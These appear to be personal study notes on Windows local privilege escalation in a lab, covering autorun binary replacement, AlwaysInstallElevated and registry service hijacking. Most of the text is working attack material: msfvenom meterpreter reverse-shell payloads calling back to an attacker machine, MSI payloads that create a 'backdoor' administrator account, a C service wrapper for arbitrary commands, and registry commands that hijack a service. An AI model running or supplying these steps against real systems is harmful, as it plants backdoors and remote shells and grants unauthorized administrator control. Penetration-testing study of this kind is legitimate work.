### Autorun
Autorun is the program which checks which program can learn automatically. Download autorun and run it 
```powershell
C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe
```

Check for autorun programs and replace that with a msfvenom payload. In our case it is located at 
```powershell
c:\program files\autorun program\program.exe	
```

Check with Accesschk and look for **FILE_ALL_ACCESS** permision
```powershell
C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Autorun Program"
```

| Commands | Use |  
| ----------- | ----------- |  
| -w | File which have write access  |  
| -v | Verbose Output |
| -u | Ignore the errors |

After you get **FILE_ALL_ACCESS** proceed with the payload

#### Payload
```bash
msfvenom -p windows/meterpreter/reverse_tcp lhost=[Kali VM IP Address] -f exe -o program.exe
```

Once any user log in this program will run and will have a reverse shell as a privilege user

### AlwaysInstallElevated
It is a feature which allows users to install programs as a elevated user. To check if the registry values are set to 1:

```powershell
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

Get-ItemProperty HKLM\Software\Policies\Microsoft\Windows\Installer
Get-ItemProperty HKCU\Software\Policies\Microsoft\Windows\Installer
```

Then create an MSI package and install it
```bash
# Generating Different Payloads
msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi -o setup.msi
msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi-nouac -o setup.msi
msfvenom -p windows/meterpreter/reverse_tcp lhost=[Kali VM IP Address] -f msi -o setup.msi

# On windows VM run to install
msiexec /quiet /qn /i C:\setup.msi\
```

Technique also available in :

   * Metasploit : `exploit/windows/local/always_install_elevated`
   * PowerUp.ps1 : `Get-RegistryAlwaysInstallElevated`, `Write-UserAddMSI`

### Registry Service (regsvc)
First look if you have full access to any registry service
```powershell
Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
```
![[Pasted image 20210717181827.png]]

Now we have to compile a C file which will run system commands
```C
#include <windows.h>
#include <stdio.h>

#define SLEEP_TIME 5000

SERVICE_STATUS ServiceStatus; 
SERVICE_STATUS_HANDLE hStatus; 
 
void ServiceMain(int argc, char** argv); 
void ControlHandler(DWORD request); 

//add the payload here
int Run() 
{ 
    system("whoami > c:\\windows\\temp\\service.txt");
    return 0; 
} 

int main() 
{ 
    SERVICE_TABLE_ENTRY ServiceTable[2];
    ServiceTable[0].lpServiceName = "MyService";
    ServiceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;

    ServiceTable[1].lpServiceName = NULL;
    ServiceTable[1].lpServiceProc = NULL;
 
    StartServiceCtrlDispatcher(ServiceTable);  
    return 0;
}

void ServiceMain(int argc, char** argv) 
{ 
    ServiceStatus.dwServiceType        = SERVICE_WIN32; 
    ServiceStatus.dwCurrentState       = SERVICE_START_PENDING; 
    ServiceStatus.dwControlsAccepted   = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    ServiceStatus.dwWin32ExitCode      = 0; 
    ServiceStatus.dwServiceSpecificExitCode = 0; 
    ServiceStatus.dwCheckPoint         = 0; 
    ServiceStatus.dwWaitHint           = 0; 
 
    hStatus = RegisterServiceCtrlHandler("MyService", (LPHANDLER_FUNCTION)ControlHandler); 
    Run(); 
    
    ServiceStatus.dwCurrentState = SERVICE_RUNNING; 
    SetServiceStatus (hStatus, &ServiceStatus);
 
    while (ServiceStatus.dwCurrentState == SERVICE_RUNNING)
    {
		Sleep(SLEEP_TIME);
    }
    return; 
}

void ControlHandler(DWORD request) 
{ 
    switch(request) 
    { 
        case SERVICE_CONTROL_STOP: 
			ServiceStatus.dwWin32ExitCode = 0; 
            ServiceStatus.dwCurrentState  = SERVICE_STOPPED; 
            SetServiceStatus (hStatus, &ServiceStatus);
            return; 
 
        case SERVICE_CONTROL_SHUTDOWN: 
            ServiceStatus.dwWin32ExitCode = 0; 
            ServiceStatus.dwCurrentState  = SERVICE_STOPPED; 
            SetServiceStatus (hStatus, &ServiceStatus);
            return; 
        
        default:
            break;
    } 
    SetServiceStatus (hStatus,  &ServiceStatus);
    return; 
} 
```

^db55e3

Now for payload we will add a user to the administrator group

```powershell
cmd.exe /k net localgroup administrators <username> /add
```

After editing compile the payload and transfer the file to the windows vm
```bash
x86_64-w64-mingw32-gcc windows_service.c -o x.exe
```

Now open the command prompt and add the following command
```powershell
 reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f
 ```
 
 | Commands | Use |  
| ----------- | ----------- |  
| /v | Value  |  
| /t | type |
| /d | data |
| /f | no prompt |

**REG_EXPAND_SZ** means the string value which will be replaced by the /d value

Now start the registry service
```powershell
sc start regsvc
```

Check the administrator group
```powershell
net localgroup administrators
```